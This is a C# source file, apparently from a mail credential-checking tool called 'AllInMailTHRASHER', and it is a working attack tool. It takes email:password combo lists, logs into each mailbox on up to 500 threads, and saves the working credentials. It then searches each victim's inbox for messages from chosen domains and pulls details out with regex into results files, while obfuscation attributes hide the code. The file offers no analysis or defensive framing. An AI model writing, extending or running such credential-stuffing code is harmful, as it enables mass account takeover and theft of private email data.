using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;

namespace AllInMailTHRASHER.PluginManager
{
    class Container : IPlugin
    {
        public Container(PSettings settings)
        {
            IsWorked = false;
            _pSettings = settings;
        }

        private static object ob = new object();
        private PSettings _pSettings;
        private Thread[] _threads;
        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public PSettings GetSettings()
        {
            return _pSettings;
        }
        public bool IsWorked { get; private set; }
        public int Good { get; private set; }
        public int Bad { get; private set; }
        public int Error { get; set; }
        public int MailAccess { get; set; }
        private string Date;
        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public void Start(string ss)
        {
            if (_pSettings.Threads > 500)
                _pSettings.Threads = 500;
            if (!IsWorked)
            {
                Directory.CreateDirectory("Results");
                Date = ss;
                _threads = new Thread[_pSettings.Threads];
                IsWorked = true;
                for (int i = 0; i < _pSettings.Threads; i++)
                {
                    _threads[i] = new Thread(Hook) { IsBackground = true };
                    _threads[i].Start();
                }

            }
        }
        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public void Stop()
        {
            foreach (var VARIABLE in _threads)
            {
                VARIABLE.Abort();
            }
            IsWorked = false;
        }
        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public string GetName()
        {
            return _pSettings.Name;
        }
        static IEnumerable<string> lines = File.ReadAllLines("combo.txt").Distinct();
        static ConcurrentQueue<string> line = new ConcurrentQueue<string>(lines);
        public static int count = 0;
        public int end = lines.Count();
        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public void Hook()
        {
            while (line.TryDequeue(out var combo))
            {
                var combos = combo.Split(';', ':');
                if (combos.Length != 2)
                {
                    return;
                }
                Check(combos[0], combos[1], Date);
                count++;
                int left = end - count;
                Console.Title = $"Mail Refresher | Left: {left} | MailAccess: {MailAccess}";
            }
            while ((end - count) != 0)
              {
            Thread.Sleep(100);
              }
            }
        List<Variabless> variabless = new List<Variabless>();
        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public void Check(string email, string pass, string date)
        {
            try
            {
                var combo = email.Split('@');

                var client = ClientConfig.GetMailClient(combo[1]);
                if (!client.Connect())
                {
                    Bad++;
                    return;
                }
                if (!client.Login(email, pass))
                {
                    Bad++;
                    return;
                }
                if(client.IsAuthenticated && client.IsConnected)
                {
                    lock (ob)
                    {
                        File.AppendAllText("mail-access.txt", $"{email}:{pass}\r\n");
                        MailAccess++;
                    }
                }
                foreach (var x in _pSettings.requests)
                {
                    var messages = client.GetMessages(x.Domain, DateTime.Parse(date));
                    foreach (var message in messages)
                    {

                        string messs = message.Subject + " " + message.AlternateViews[1].Body;
                        foreach(var failureKey in x.failureKeys)
                        {
                            if (messs.Contains(failureKey.key))
                            {
                                Bad++;
                                return;
                            }
                                
                        }
                        foreach (var successKeys in x.successKeys)
                        {
                            if (!messs.Contains(successKeys.key))
                            {
                                Error++;
                                return;
                            }

                        }
                        int index = 0;
                        foreach (var list in x.variables)
                        {
                            index++;
                            switch (list.regexpos)
                            {
                                case "Body":
                                    variabless.Add(new Variabless
                                    {
                                        index = index,
                                        result = Regex.Match(message.AlternateViews[1].Body, list.regex)
                                    });
                                    break;
                                case "Subject":
                                    variabless.Add(new Variabless
                                    {
                                        index = index,
                                        result = Regex.Match(message.AlternateViews[1].Body, list.regex)
                                    });
                                    break;
                                default:
                                    break;
                            }
                        }
                        lock (ob)
                        {
                            Good++;
                            string caps = _pSettings.Capture.Replace("<EMAIL>", email).Replace("<PASS>", pass).Replace("<Message.Subject>", message.Subject).Replace("<Message.From>", message.From.Address).Replace("<Message.Date>", message.Date.ToShortDateString());
                            caps = getRegex(caps);
                            caps = getReplace(caps);
                            Console.WriteLine(caps);
                            string capss = _pSettings.FileOutput.Replace("<EMAIL>", email).Replace("<PASS>", pass).Replace("<Message.Subject>", message.Subject).Replace("<Message.From>", message.From.Address).Replace("<Message.Date>", message.Date.ToShortDateString());
                            capss = getRegex(capss);
                            capss = getReplace(capss);
                            File.AppendAllText(Directory.GetCurrentDirectory() + "\\Results\\" + _pSettings.FileName + ".txt", capss + "\r\n");
                        }
                    }
                    variabless.Clear();
                }
            }
            catch { }
        }
        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public string getRegex(string cap)
        {
            MatchCollection m = Regex.Matches(cap, "<Regex\\s*\\[([^|]*)\\|([^]]*)");
            foreach (Match mm in m)
            {
                Dictionary<int, Match> x = variabless.ToDictionary(xs => xs.index, p => p.result);
                x.TryGetValue(Convert.ToInt32(mm.Groups[1].Value), out Match xsz);
                cap = Regex.Replace(cap, $"<Regex\\s*\\[{mm.Groups[1].Value}\\|{mm.Groups[2].Value}\\]>", xsz.Groups[mm.Groups[2].Value].Value);
            }
            return cap;
        }
        [Obfuscation(Feature = "virtualization", Exclude = false)]
        public string getReplace(string cap)
        {
            MatchCollection m = Regex.Matches(cap, "<Replace\\s*\\[([^|]*)\\|([^]]*)");
            foreach (Match mm in m)
            {
                cap = Regex.Replace(cap, $"<Replace\\s*\\[{mm.Groups[1].Value}\\|{mm.Groups[2].Value}\\]>", "");
                cap = cap.Replace(mm.Groups[1].Value, mm.Groups[2].Value);
            }
            return cap;
        }
    }

    }
    public class Variabless
    {
        public int index { get; set; }
        public Match result { get; set; }
    }
